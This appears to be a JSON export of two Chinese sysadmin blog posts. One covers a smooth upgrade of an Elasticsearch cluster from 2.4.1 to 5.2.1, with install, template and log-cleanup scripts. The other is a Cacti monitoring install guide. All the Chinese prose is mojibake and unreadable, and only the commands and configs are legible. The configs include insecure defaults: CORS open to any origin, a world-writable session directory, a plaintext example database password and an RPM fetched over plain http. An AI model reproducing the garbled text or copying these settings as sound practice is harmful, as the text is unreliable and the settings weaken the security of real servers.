Shardçš„ç´¢å¼•é‡å¤§æ¦‚åœ¨600ä¸ªGï¼Œè€ƒè™‘åˆ°æ€§èƒ½é—®é¢˜ï¼Œæˆ‘ä»¬æ²¡è¦å¤åˆ¶åˆ†ç‰‡ï¼ŒåŒæ—¶ç€é‡åšäº†ESé›†ç¾¤çš„è°ƒä¼˜ï¼Œæ—¥å¿—ä¿ç•™7å¤©ã€‚ ä»æ•´ä½“æ¶æ„è¿›è¡ŒæŠ½è±¡æ€»ç»“ï¼Œå…¶å®å°±æ˜¯é‡‡é›†-&gt;æ¸…æ´—-&gt;ç´¢å¼•-&gt;å±•ç°å››ä¸ªç¯èŠ‚ï¼Œå†å»è€ƒè™‘å„ç¯èŠ‚ä¸­ç¼“å­˜ã€é˜Ÿåˆ—çš„ä½¿ç”¨ï¼Œæ¯ä¸ªç¯èŠ‚ç‚¹ç”¨ä¸åŒçš„è½¯ä»¶æ¥å®ç°ã€‚ä¸‹é¢ä»‹ç»ä¸€ä¸‹æˆ‘ç›®å‰æ–¹æ¡ˆé›†ç¾¤çš„æ­å»ºå’Œé…ç½®ã€‚ ESé›†ç¾¤æ–¹æ¡ˆå¹³æ»‘ï¼šESè€é›†ç¾¤ç”¨çš„2.4.1ç‰ˆæœ¬ï¼Œè·‘çš„æ¯”è¾ƒå¥½å°±ä¸€ç›´æ²¡åŠ¨ï¼Œæœ€è¿‘çœ‹èµ„æ–™ES5.Xå·²ç»ç¨³å®šï¼Œå¹¶ä¸”æ€§èƒ½æœ‰è¾ƒå¤§æå‡ï¼Œå¿ƒé‡Œå°±å‘ç—’äº†ï¼Œä½†ç”±äºä¸šåŠ¡è¦ä¿æŒé«˜å¯ç”¨çš„å±æ€§ï¼Œå°±å¾—æƒ³ä¸€ä¸ªå¹³æ»‘å‡çº§çš„æ–¹æ¡ˆï¼Œæœ€åæƒ³åˆ°äº†å¤šå®ä¾‹è¿‡åº¦çš„åŠæ³•ï¼Œ5.Xç‰ˆæœ¬ç½‘ä¸Šä»‹ç»é…ç½®å˜åŒ–è¾ƒå¤§ï¼Œä¹Ÿåšå¥½äº†è¸©å‘å‡†å¤‡ï¼Œç¡®å®šå¥½è¦å‡çº§åï¼Œç«‹åˆ»åŠ¨æ‰‹ã€‚ ä¸€ã€å¯¹åº”å‡çº§æ”¹é€ æ–¹æ¡ˆ 12341. ä½¿ç”¨ç«¯å£9220å’Œ9330 å®‰è£…å¹¶é…ç½®å¥½æ–°çš„ES5.2.1å®ä¾‹2. å…³æ‰logstashå¹¶å°†ES2.4.1å®ä¾‹å †æ ˆè°ƒå°é‡å¯ï¼ˆkafkaä¿ç•™3ä¸ªå°æ—¶æ—¥å¿—æ‰€ä»¥ä¸ä¼šä¸¢å¤±3. å¯åŠ¨ES5.2.1å¹¶å°†logstashå¼€å¯æŒ‡å‘ES5.2.14. å®‰è£…æ–°ç‰ˆkibanaå®ä¾‹åšå¥½æŒ‡å‘ï¼Œè€æ•°æ®ç”¨http://host/oldè®¿é—®â€”â€”&gt;ES5.2.1é…ç½®è°ƒä¼˜ã€‚ äºŒã€å‡çº§åç»Ÿä¸€ç”¨supervisord-monitorç®¡ç†ä¸‰ã€å‘¨æœ«è·‘äº†ä¸€å¤©ESçš„cpuã€IOã€heapå†…å­˜ä½¿ç”¨ç‡ï¼Œesç£ç›˜æƒ…å†µï¼Œé›†ç¾¤å¥åº·ç›‘æµ‹å’Œthread_poolçš„ç›‘æ§æ•°æ®ï¼ˆéœ€è¦äº†è§£çš„æ·»åŠ QQç¾¤ï¼‰å››ã€å‡çº§è¿‡ç¨‹â€”â€”ç¼–å†™äº†ES5.2.1çš„å®‰è£…è„šæœ¬å¦‚ä¸‹ é›†ç¾¤è„šæœ¬åŒ–éƒ¨ç½²ï¼šä¹‹å‰ç”¨çš„rpmåŒ…ï¼Œåè€ƒè™‘ç›´æ¥ä½¿ç”¨taråŒ…å®‰è£…ï¼Œå¯¹äºéœ€è¦ç³»ç»Ÿåšçš„è°ƒä¼˜æ“ä½œï¼Œç›´æ¥ç¼–å†™è‡ªåŠ¨åŒ–å®‰è£…è„šæœ¬ï¼Œä¸€é”®å°†æ‰€æœ‰ç³»ç»Ÿå‚æ•°é…ç½®åï¼Œå°†ç¯å¢ƒæ­å»ºå¥½ã€‚ 12345678910111213141516#/bin/shid elasticsearch || useradd elasticsearch -s /sbin/nologin #æ·»åŠ ç”¨æˆ·grep \"* - nofile 512000\" /etc/security/limits.conf || echo \"* - nofile 512000\" &gt;&gt; /etc/security/limits.conf #ä¿®æ”¹æ–‡ä»¶æè¿°ç¬¦æ•°é‡grep \"elasticsearch - nproc unlimited\" /etc/security/limits.conf || echo \"elasticsearch - nproc unlimited\" &gt;&gt; /etc/security/limits.conf #ä¿®æ”¹æœ€å¤§æ‰“å¼€è¿›ç¨‹æ•°æ•°é‡grep \"fs.file-max = 1024000\" /etc/sysctl.conf || echo \"fs.file-max = 1024000\" &gt;&gt; /etc/sysctl.conf #ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶æè¿°ç¬¦grep \"vm.max_map_count = 262144\" /etc/sysctl.conf || echo \"vm.max_map_count = 262144\" &gt;&gt; /etc/sysctl.conf #ä¿®æ”¹ç¨‹åºæœ€å¤§ç®¡ç†çš„vmsysctl -pcd /usr/local/src[ ! -f /usr/local/src/elasticsearch-5.2.1.zip ] &amp;&amp; wget https://artifacts.elastic.co/dow ... ticsearch-5.2.1.zip[ ! -d /usr/local/src/elasticsearch-5.2.1 ] &amp;&amp; unzip elasticsearch-5.2.1.zipmv elasticsearch-5.2.1 /usr/local/chown -R elasticsearch:elasticsearch /usr/local/elasticsearch-5.2.1 #ä¿®æ”¹æ‹¥æœ‰è€…æ‰€æœ‰ç»„sed -i 's/-XX:+UseConcMarkSweepGC/-XX:+UseG1GC/' /usr/local/elasticsearch-5.2.1/config/jvm.options #GCæ–¹å¼ä¿®æ”¹ä¸ºG1sed -i 's/-XX:CMSInitiatingOccupancyFraction=75/-XX:MaxGCPauseMillis=200/' /usr/local/elasticsearch-5.2.1/config/jvm.optionssed -i 's/-XX:+UseCMSInitiatingOccupancyOnly/#-XX:+UseCMSInitiatingOccupancyOnly/' /usr/local/elasticsearch-5.2.1/config/jvm.options äº”ã€å‡çº§è¿‡ç¨‹â€”â€”é…ç½®æ–‡ä»¶ã€ç´¢å¼•ç›¸å…³çš„æ›´æ–°è°ƒä¼˜ å‡çº§æœŸé—´ç€å®è¸©äº†ä¸å°‘å‘ï¼Œè€ç‰ˆESç´¢å¼•é…ç½®å¯ä»¥ç›´æ¥å†™åˆ°é…ç½®æ–‡ä»¶é‡Œï¼Œæ–°ç‰ˆæ˜¯ä¸è¡Œçš„ï¼Œå¿…é¡»ä½¿ç”¨apiå»è®¾ç½®ï¼Œå¦å¤–ES2.Xç‰ˆæœ¬çš„è¿›ç¨‹æ•°è°ƒä¼˜ï¼Œåœ¨ES5.Xæˆ‘å‘ç°è°ƒæ•´ä¸å¦æ²¡æœ‰å½±å“ã€‚é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š 123456789101112cluster.name: yz-5searchpath.data: /data1/LogData5/path.logs: /data1/LogData5/logsbootstrap.memory_lock: false #centos6å†…æ ¸ä¸æ”¯æŒï¼Œå¿…é¡»è¦å…³é—­bootstrap.system_call_filter: falsenetwork.host: 10.39.40.94http.port: 9220transport.tcp.port: 9330discovery.zen.ping.unicast.hosts: [\"10.39.40.94:9330\",\"10.39.40.95:9330\",\"10.39.40.96:9330\",\"10.39.40.97:9330\"]discovery.zen.minimum_master_nodes: 2http.cors.enabled: truehttp.cors.allow-origin: \"*\" ä¸ºäº†åŠ å¿«ç´¢å¼•æ•ˆç‡ï¼Œç¼–å†™indexçš„æ¨¡æ¿é…ç½®ï¼ˆindexé…ç½®ä¸å…è®¸å†™åˆ°é…ç½®æ–‡ä»¶äº†ï¼‰ï¼Œå°†å‚æ•°putåˆ°esçš„é‡Œï¼Œå½“ç„¶æ¨¡æ¿ä¹Ÿå¯ä»¥é€šè¿‡å‰ç«¯logstashæŒ‡å®šï¼ˆè¦æ”¹logtashè§‰å¾—éº»çƒ¦ï¼‰ï¼Œtemplateè„šæœ¬å¦‚ä¸‹ï¼š 12345678910111213141516#/bin/sh#index templatecurl -XPUT 'http://10.39.40.94:9220/_template/cms_logs?pretty' -d '&#123; \"order\": 6, #ä¼˜å…ˆçº§ \"template\": \"logstash-cms*\", #æ­£åˆ™åŒ¹é…ç´¢å¼• \"settings\": &#123; \"index.refresh_interval\" : \"60s\", #ç´¢å¼•åˆ·æ–°æ—¶é—´ \"index.number_of_replicas\" : \"0\", #å‰¯æœ¬æ•°è®¾ç½®ä¸º0 \"index.number_of_shards\" : \"8\", #åˆ†ç‰‡æ•°è®¾ç½®ä¸º8ï¼Œå…±4å°æœåŠ¡å™¨ \"index.translog.flush_threshold_size\" : \"768m\", #translogè§¦å‘flushçš„é˜€å€¼ \"index.store.throttle.max_bytes_per_sec\" : \"500m\", #å­˜å‚¨çš„é˜€å€¼ \"index.translog.durability\": \"async\", #è®¾ç½®translogå¼‚æ­¥åˆ·æ–°åˆ°ç¡¬ç›˜ï¼Œæ›´æ³¨é‡æ€§èƒ½ \"index.merge.scheduler.max_thread_count\": \"1\", #æœºæ¢°ç›˜è®¾ç½®ä¸º1 \"index.routing.allocation.total_shards_per_node\": \"2\" #æ¯ä¸ªèŠ‚ç‚¹ä¸Šä¸¤ä¸ªåˆ†ç‰‡ &#125;&#125;' å¤‡ï¼šå¦‚æœæ˜¯æ›´æ”¹ï¼Œå°†PUTæ”¹ä¸ºPOST æ—¥å¿—ä¿ç•™7å¤©ï¼Œæ¸…é™¤çš„è„šæœ¬å¦‚ä¸‹ï¼Œå†™å…¥è®¡åˆ’ä»»åŠ¡ï¼š 1234#!/bin/bashDATE=`date +%Y.%m.%d.%I`DATA2=`date +%Y.%m.%d -d'-7 day'`curl -XDELETE \"http://10.39.40.97:9220/logstash-*-$&#123;DATA2&#125;*?pretty\" ç”±äºå•ä¸ªç´¢å¼•è¾¾åˆ°äº†35Gç”šè‡³40Gä»¥ä¸Šï¼Œäºæ˜¯åœ¨logstashå±‚é¢å¯¹å»ºç´¢å¼•æ•°é‡è¿›è¡Œä¿®æ”¹ï¼ŒæŠŠæ¯å¤©12ä¸ªç´¢å¼•ä¿®æ”¹ä¸ºæ¯å¤©24ä¸ªç´¢å¼•ï¼š logstashçš„ä¿®æ”¹å¦‚ä¸‹ï¼š 12index =&gt; \"logstash-cms-front-nginx-%&#123;+YYYY.MM.dd.hh&#125;\" ä¿®æ”¹ä¸ºindex =&gt; \"logstash-cms-front-nginx-%&#123;+YYYY.MM.dd.HH&#125;\" *æ›´æ–°è‡ªåŠ¨åŒ–æ­å»ºesé›†ç¾¤ï¼Œæ¶æ„æ¢³ç†è¯¦è§£-ä¸å®ç°esç›‘æ§æœåŠ¡ å‚è€ƒï¼š Logstashåˆ†äº«,onlineç”Ÿäº§ç¯å¢ƒçš„ä½¿ç”¨,onlineæ—¥å¿—è§„èŒƒã€‚ â˜ºå¾…æ•´ç†ç»­å†™~~ Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/09/14/æ—¥å¿—åˆ†æ\u0010å¹³å°/Elasticsearch/ELKæ¶æ„æ¢³ç†-ä¹‹ES 2.4åŒå®ä¾‹å¹³æ»‘å‡çº§è‡³5.2.1è¸©å‘å¹¶supervisorç®¡ç†ç¬”è®°/"},{"title":"äº†è§£Cactiç›‘æ§å®‰è£…ä¸é…ç½®.md","text":"ä»€ä¹ˆæ˜¯Cacti?Cactiï¼Œ åœ¨è‹±æ–‡ä¸­çš„æ„æ€æ˜¯ä»™äººæŒçš„æ„æ€ï¼ŒCactiæ˜¯ä¸€å¥—åŸºäºPHP,MySQL,SNMPåŠRRDToolå¼€å‘çš„ç½‘ç»œæµé‡ç›‘æµ‹å›¾å½¢åˆ†æå·¥å…·ã€‚å®ƒé€šè¿‡snmpgetæ¥è·å–æ•°æ®ï¼Œä½¿ç”¨ RRDtoolç»˜ç”»å›¾å½¢ï¼Œè€Œä¸”ä½ å®Œå…¨å¯ä»¥ä¸éœ€è¦äº†è§£RRDtoolå¤æ‚çš„å‚æ•°ã€‚å®ƒæä¾›äº†éå¸¸å¼ºå¤§çš„æ•°æ®å’Œç”¨æˆ·ç®¡ç†åŠŸèƒ½ï¼Œå¯ä»¥æŒ‡å®šæ¯ä¸€ä¸ªç”¨æˆ·èƒ½æŸ¥çœ‹æ ‘çŠ¶ç»“æ„ã€hostä»¥åŠä»»ä½•ä¸€å¼ å›¾ï¼Œè¿˜å¯ä»¥ä¸LDAPç»“åˆè¿›è¡Œç”¨æˆ·éªŒè¯ï¼ŒåŒæ—¶ä¹Ÿèƒ½è‡ªå·±å¢åŠ æ¨¡æ¿ï¼ŒåŠŸèƒ½éå¸¸å¼ºå¤§å®Œå–„ã€‚Cacti çš„å‘å±•æ˜¯åŸºäºè®© RRDTool ä½¿ç”¨è€…æ›´æ–¹ä¾¿ä½¿ç”¨è¯¥è½¯ä»¶ï¼Œé™¤äº†åŸºæœ¬çš„ Snmp æµé‡è·Ÿç³»ç»Ÿèµ„è®¯ç›‘æ§å¤–ï¼ŒCacti ä¹Ÿå¯å¤–æŒ‚ Scripts åŠåŠ ä¸Š Templates æ¥ä½œå‡ºå„å¼å„æ ·çš„ç›‘æ§å›¾ã€‚ Cactiæ˜¯ç”¨phpè¯­è¨€å®ç°çš„ä¸€ä¸ªè½¯ä»¶ï¼Œå®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯ç”¨snmpæœåŠ¡è·å–æ•°æ®ï¼Œç„¶åç”¨rrdtoolå‚¨å­˜å’Œæ›´æ–°æ•°æ®ï¼Œå½“ç”¨æˆ·éœ€è¦æŸ¥çœ‹æ•°æ®çš„æ—¶å€™ç”¨rrdtoolç”Ÿæˆå›¾è¡¨å‘ˆç°ç»™ç”¨æˆ·ã€‚å› æ­¤ï¼Œsnmpå’Œrrdtoolæ˜¯cactiçš„å…³é”®ã€‚Snmpå…³ç³»ç€æ•°æ®çš„æ”¶é›†ï¼Œrrdtoolå…³ç³»ç€æ•°æ®å­˜å‚¨å’Œå›¾è¡¨çš„ç”Ÿæˆã€‚ Mysqlé…åˆPHPç¨‹åºå­˜å‚¨ä¸€äº›å˜é‡æ•°æ®å¹¶å¯¹å˜é‡æ•°æ®è¿›è¡Œè°ƒç”¨ï¼Œå¦‚ï¼šä¸»æœºåã€ä¸»æœºipã€snmpå›¢ä½“åã€ç«¯å£å·ã€æ¨¡æ¿ä¿¡æ¯ç­‰å˜é‡ã€‚ snmpæŠ“åˆ°æ•°æ®ä¸æ˜¯å­˜å‚¨åœ¨mysqlä¸­ï¼Œè€Œæ˜¯å­˜åœ¨rrdtoolç”Ÿæˆçš„rrdæ–‡ä»¶ä¸­ï¼ˆåœ¨cactiæ ¹ç›®å½•çš„rraæ–‡ä»¶å¤¹ä¸‹ï¼‰ã€‚rrdtoolå¯¹æ•°æ®çš„æ›´æ–°å’Œå­˜å‚¨å°±æ˜¯å¯¹rrdæ–‡ä»¶çš„å¤„ç†ï¼Œrrdæ–‡ä»¶æ˜¯å¤§å°å›ºå®šçš„æ¡£æ¡ˆæ–‡ä»¶ï¼ˆRound Robin Archiveï¼‰ï¼Œå®ƒèƒ½å¤Ÿå­˜å‚¨çš„æ•°æ®ç¬”æ•°åœ¨åˆ›å»ºæ—¶å°±å·²ç»å®šä¹‰ã€‚å…³äºRRDToolçš„çŸ¥è¯†è¯·å‚é˜…RRDToolæ•™å­¦ã€‚ ä»€ä¹ˆæ˜¯SNMPï¼Ÿsnmp(Simple Network Management Protocal, ç®€å•ç½‘ç»œç®¡ç†åè®®)åœ¨æ¶æ„ä½“ç³»çš„ç›‘æ§å­ç³»ç»Ÿä¸­å°†æ‰®æ¼”é‡è¦è§’è‰²ã€‚å¤§ä½“ä¸Šï¼Œå…¶åŸºæœ¬åŸç†æ˜¯ï¼Œåœ¨æ¯ä¸€ä¸ªè¢«ç›‘æ§çš„ä¸»æœºæˆ–èŠ‚ç‚¹ä¸Š (å¦‚äº¤æ¢æœº)éƒ½è¿è¡Œäº†ä¸€ä¸ª agentï¼Œç”¨æ¥æ”¶é›†è¿™ä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰ç›¸å…³çš„ä¿¡æ¯ï¼ŒåŒæ—¶ç›‘å¬ snmp çš„ portï¼Œä¹Ÿå°±æ˜¯ UDP 161ï¼Œå¹¶ä»è¿™ä¸ªç«¯å£æ¥æ”¶æ¥è‡ªç›‘æ§ä¸»æœºçš„æŒ‡ä»¤(æŸ¥è¯¢å’Œè®¾ç½®)ã€‚ å¦‚æœå®‰è£… net-snmpï¼Œè¢«ç›‘æ§ä¸»æœºéœ€è¦å®‰è£… net-snmp(åŒ…å«äº† snmpd è¿™ä¸ª agent)ï¼Œè€Œç›‘æ§ç«¯éœ€è¦å®‰è£… net-snmp-utilsï¼Œè‹¥æ¥å—è¢«ç›‘æ§ç«¯é€šè¿‡trap-communicateå‘æ¥çš„ä¿¡æ¯çš„è¯ï¼Œåˆ™éœ€è¦å®‰è£…net-snmpï¼Œå¹¶å¯ç”¨trapæœåŠ¡ã€‚å¦‚æœè‡ªè¡Œç¼–è¯‘ï¼Œéœ€è¦ beecrypt(libbeecrypt)å’Œ elf(libraryelf)çš„åº“ã€‚ ä»€ä¹ˆæ˜¯RRDtoolsï¼ŸRRDtoolæ˜¯æŒ‡Round Robin Database å·¥å…·ï¼ˆç¯çŠ¶æ•°æ®åº“ï¼‰ã€‚Round robinæ˜¯ä¸€ç§å¤„ç†å®šé‡æ•°æ®ã€ä»¥åŠå½“å‰å…ƒç´ æŒ‡é’ˆçš„æŠ€æœ¯ã€‚æƒ³è±¡ä¸€ä¸ªå‘¨è¾¹æ ‡æœ‰ç‚¹çš„åœ†ç¯ï¼ï¼è¿™äº›ç‚¹å°±æ˜¯æ—¶é—´å­˜å‚¨çš„ä½ç½®ã€‚ä»åœ†å¿ƒç”»ä¸€æ¡åˆ°åœ†å‘¨çš„æŸä¸ªç‚¹çš„ç®­å¤´ï¼ï¼è¿™å°±æ˜¯æŒ‡é’ˆã€‚å°±åƒæˆ‘ä»¬åœ¨ä¸€ä¸ªåœ†ç¯ä¸Šä¸€æ ·ï¼Œæ²¡æœ‰èµ·ç‚¹å’Œç»ˆç‚¹ï¼Œä½ å¯ä»¥ä¸€ç›´å¾€ä¸‹èµ°ä¸‹å»ã€‚è¿‡æ¥ä¸€æ®µæ—¶é—´ï¼Œæ‰€æœ‰å¯ç”¨çš„ä½ç½®éƒ½ä¼šè¢«ç”¨è¿‡ï¼Œè¯¥å¾ªç¯è¿‡ç¨‹ä¼šè‡ªåŠ¨é‡ç”¨åŸæ¥çš„ä½ç½®ã€‚è¿™æ ·ï¼Œæ•°æ®é›†ä¸ä¼šå¢å¤§ï¼Œå¹¶ä¸”ä¸éœ€è¦ç»´æŠ¤ã€‚RRDtoolå¤„ç†RRDæ•°æ®åº“ã€‚å®ƒç”¨å‘RRDæ•°æ®åº“å­˜å‚¨æ•°æ®ã€ä»RRDæ•°æ®åº“ä¸­æå–æ•°æ®ã€‚ Cactiæ˜¯åŸºäºnginxï¼Œrrdtoolï¼Œmysqlï¼Œphpï¼Œsnmpæ¥è¿è¡Œçš„. 1.å®‰è£…æ“ä½œç³»ç»Ÿcentos6.0ä»¥ä¸Šç‰ˆæœ¬ 2.é…ç½®å¥½ç½‘ç»œIPå’ŒDNS 3.ä¿®æ”¹ç³»ç»Ÿæ—¶åŒºå’Œæ—¶é—´ï¼Œä½¿ç”¨ä¸Šæµ·æ—¶åŒº å¤‡ä»½åŸæœ‰çš„æ—¶åŒºæ–‡ä»¶ 1cp /etc/localtime /etc/localtime.bak ç”¨ä¸Šæµ·æ—¶åŒºæ–‡ä»¶æ›¿æ¢ç³»ç»Ÿæ—¶åŒºæ–‡ä»¶ 1cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime ä¿®æ”¹/etc/sysconfig/clockæ–‡ä»¶ï¼Œä¿®æ”¹ä¸ºï¼š 123ZONE=\"Asia/Shanghai\"UTC=falseARC=false åŒæ­¥æ—¶é—´ 1ntpdate time.nist.gov 4.å®‰è£…epelæº 1rpm -Uvh http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm 5.å®‰è£…åŸºç¡€æ”¯æŒè½¯ä»¶ 1yum install -y openssh-clients telnet wget nginx php-cgi php-cli spawn-fcgi mysql-servermysql rrdtoolnet-snmp net-snmp-utils net-snmp-devel php-mysql php-snmp 6.é…ç½®PHPç®¡ç†å™¨ ï¼ˆ1ï¼‰cd /etc/sysconfig è¿›å…¥sysconfigæ–‡ä»¶å¤¹ ï¼ˆ2ï¼‰vi spawn-fcgi åœ¨æ–‡ä»¶æ”¹ä½ç½®æ·»åŠ å¦‚ä¸‹å‘½ä»¤ 1234#SOCKET=/var/run/php-fcgi.sock#OPTIONS=\"-u apache -g apache -s $SOCKET -S -M 0600 -C 32 -F 1 -P /var/run/spawn-fcgi.pid -- /usr/bin/php-cgi\" SOCKET=/var/run/php-fcgi.sock OPTIONS=\"-u nginx -g nginx -s $SOCKET -S -M 0600 -C 32 -F 1 -P /var/run/spawn-fcgi.pid -- /usr/bin/php-cgi\" ï¼ˆ3ï¼‰/etc/init.d/spawn-fcgi restart é‡å¯phpç®¡ç†å™¨ ï¼ˆ4ï¼‰chkconfig spawn-fcgi on è®¾ç½®å¼€æœºå¯åŠ¨æœåŠ¡ 7.è¡¥å……åˆ›å»º/var/lib/phpä¸‹ session ç›®å½• 123mkdir -p /var/lib/php/sessionchown -R nginx.nginx /var/lib/php/sessionchmod 777 /var/lib/php/session 8.ä¿®æ”¹PHPæ–‡ä»¶é…ç½® vi /etc/php.ini ï¼ˆ1ï¼‰ä¿®æ”¹PHPæ—¶åŒºä¸ºAsia/ShangHaiï¼Œåœ¨æ–‡ä»¶å¦‚ä¸‹ä½ç½®æ·»åŠ è¯¥å¥å‘½ä»¤ 12345678;;;;;;;;;;;;;;;;;;;; Module Settings ;;;;;;;;;;;;;;;;;;;;[Date]; Defines the default timezone used by the date functions; http://www.php.net/manual/en/datetime.configuration.php#ini.date.timezone;date.timezone =date.timezone = Asia/Shanghai ï¼ˆ2ï¼‰ä¿®æ”¹PHPè°ƒç”¨å†…å­˜é™åˆ¶ï¼Œåœ¨æ–‡ä»¶å¦‚ä¸‹ä½ç½®ä¿®æ”¹å¦‚ä¸‹æ·»åŠ ï¼š date.timezone = Asia/Shanghai memory_limit = 512M 123456789101112131415161718192021;;;;;;;;;;;;;;;;;;;; Resource Limits ;;;;;;;;;;;;;;;;;;;;; Maximum execution time of each script, in seconds; http://www.php.net/manual/en/info.configuration.php#ini.max-execution-timemax_execution_time = 30; Maximum amount of time each script may spend parsing request data. It's a good; idea to limit this time on productions servers in order to eliminate unexpectedly; long running scripts.; Default Value: -1 (Unlimited); Development Value: 60 (60 seconds); Production Value: 60 (60 seconds); http://www.php.net/manual/en/info.configuration.php#ini.max-input-timemax_input_time = 60; Maximum input variable nesting level; http://www.php.net/manual/en/info.configuration.php#ini.max-input-nesting-level;max_input_nesting_level = 64; Maximum amount of memory a script may consume (128MB); http://www.php.net/manual/en/ini.core.php#ini.memory-limit#memory_limit = 128Mmemory_limit = 512M 10.ä¿®æ”¹nginxé…ç½®æ–‡ä»¶å¢åŠ å¯¹cactiçš„æ”¯æŒï¼ˆå¯¹åº”è‡ªå·±çš„nginxå®‰è£…ç›®å½•ï¼‰vi /usr/local/nginx/conf.d/nginx.confåœ¨æ–‡ä»¶æœ«å°¾å¤§æ‹¬å·å†…æ·»åŠ å¦‚ä¸‹é…ç½® server { listen 8080; server_name 127.0.0.1; root html; index index.html index.php; location ~ \\.php$ { root html; fastcgi_buffer_size 128k; fastcgi_buffers 8 128k; fastcgi_pass unix:/var/run/php-fcgi.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; #fastcgi_param SCRIPT_FILENAME /usr/local/nginx/html/$fastcgi_script_name; include fastcgi_params; } } chkconfig nginx on è®¾ç½®nginxå¼€æœºå¯åŠ¨ service nginx restarté‡å¯nginxæœåŠ¡ 11.å®‰è£…catic caticæ˜¯æ— éœ€ç¼–è¯‘å®‰è£…çš„ï¼Œç›´æ¥ä¸‹è½½å…¶æºåŒ…è§£å‹å³å¯ä½¿ç”¨ï¼ˆ1ï¼‰ä¸‹è½½cacti 12cd /tmpwget http://www.cacti.net/downloads/cacti-0.8.8b.tar.gz ï¼ˆ2ï¼‰è§£å‹cacti 12tar zxvf cacti-0.8.8b.tar.gzmv cacti-0.8.8b /usr/local/nginx/html #å°†è§£å‹å‡ºçš„cactiæ–‡ä»¶å¤¹ç§»åŠ¨åˆ°nginxçš„ webç›®å½•ä¸‹ï¼ˆå¯¹åº”è‡ªå·±å®‰è£…çš„nginxï¼‰ ï¼ˆ3ï¼‰ä¿®æ”¹cactiçš„ä½¿ç”¨è€…å’Œç»„æƒé™ä¸ºnginxç”¨æˆ·å’Œnginxç»„ 12cd /usr/local/nginx/htmlchown -R nginx:nginx cacti/ 12.åˆ›å»ºæ•°æ®åº“ï¼Œå­˜å‚¨cactiæ•°æ® 123å¯åŠ¨mysql/etc/init.d/mysqld startchkconfig mysqld on ï¼ˆ1ï¼‰ä½¿ç”¨rootè´¦æˆ·ç™»å½•mysql mysql -uroot ï¼ˆ2ï¼‰åˆ›å»ºcactiæ•°æ®åº“è¡¨ create database cacti; ï¼ˆ3ï¼‰å»ºç«‹ç”¨æˆ·cactiï¼Œå¯†ç cacti123(å¯è‡ªè¡Œå®šä¹‰) mysql&gt; insert into mysql.user(host,user,password) values (&apos;localhost&apos;,&apos;cacti&apos;,password(&apos;cacti123&apos;)); ï¼ˆ4ï¼‰é‡è½½mysqlæˆæƒè¡¨ mysql&gt; flush privileges; ï¼ˆ5ï¼‰ æŠŠæ•°æ®åº“cactiæˆæƒäºç”¨æˆ·cacti mysql&gt; grant all on cacti.* to cacti@&apos;localhost&apos; identified by &apos;cacti123&apos;; mysql&gt; quit ï¼ˆ6ï¼‰å°†cactiæ•°æ®åº“ä¸mysqlä¸­çš„æ•°æ®å¯¹åº”èµ·æ¥ cd /usr/local/nginx/html/cacti mysql -ucacti -pcacti123 cacti&lt;cacti.sql 13.ä¿®æ”¹CACTIé…ç½®æ–‡ä»¶ (1) åˆ‡æ¢è‡³cactiä¸‹çš„includeç›®å½•ï¼ˆå¯¹åº”è‡ªå·±å®‰è£…çš„nginxï¼‰ cd /usr/local/nginx/html/cacti/include/ (2)ç¼–è¾‘config.phpæ–‡ä»¶ï¼Œä¿®æ”¹å¦‚ä¸‹ä½ç½®çš„é…ç½® vi config.php 12345678/* make sure these values refect your actual database/host/user/password */$database_type = \"mysql\";$database_default = \"cacti\";#mysqlæ•°æ®åº“é‡Œæ‰€åˆ›å»ºçš„è¡¨å$database_hostname = \"127.0.0.1\";$database_username = \"cacti\";#mysqlæ•°æ®åº“é‡Œä¸ºcactiæ•°æ®è¡¨æ‰€åˆ›å»ºçš„ç”¨æˆ·å$database_password = \"cacti123\";#mysqlæ•°æ®åº“é‡Œä¸ºcactiæ•°æ®è¡¨æ‰€åˆ›å»ºçš„å¯†ç $database_port = \"3306\";$database_ssl = false; 14.é…ç½®cactiçš„å¾ªç¯ä»»åŠ¡ 12crontab -e*/5 * * * * php /usr/local/nginx/html/cacti/poller.php &gt; /dev/null 2&gt;&amp;1#è¯·å¯¹åº”è‡ªå·±çš„nginxå®‰è£…ç›®å½• :wq ä¿å­˜é€€å‡º å¯ç›´æ¥å…ˆè¿è¡Œä¸€éphp /usr/local/nginx/html/cacti/poller.php å¥½è®©cactiäº§ç”Ÿå›¾ç‰‡ 1php /usr/share/nginx/html/cacti/poller.php 15.å®‰è£…å®Œæˆ ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€å¦‚ä¸‹åœ°å€http://æœ¬æœºIP/cacti/install ä¼šæ˜¾ç¤ºå®‰è£…å‘å¯¼ï¼Œç‚¹å‡»NEXTå³å¯ï¼Œåˆ°ä¸‹é¢å¦‚ä¸‹ç•Œé¢æ˜¯ï¼Œæ³¨æ„æŸ¥çœ‹æ‰€æœ‰çš„æ–‡ä»¶è·¯å¾„æ˜¯å¦éƒ½ä¸ºç»¿è‰²ï¼Œä¸æ˜¯ç»¿è‰²è¯·æ‰¾åˆ°è‡ªå·±å®‰è£…çš„ç›®å½•ï¼Œä¸€ä¸€å¯¹åº”ç‚¹å‡»Finshå³å¯åˆ°è¾¾cactiçš„ç™»é™†ç•Œé¢ è¾“å…¥ç”¨æˆ·åå¯†ç ,cactié»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç éƒ½ä¸ºadminï¼Œè¾“å…¥ä¸€æ¬¡åä¼šæç¤ºåœ¨ä¸€æ¬¡è¾“å…¥ï¼Œè¿™ä¸ªæ—¶å€™æ˜¯è®©ä½ è®¾ç½®æ–°çš„adminå¯†ç .ç„¶åå°±èƒ½è¿›å…¥cactiçš„å›¾å½¢ç•Œé¢äº†. 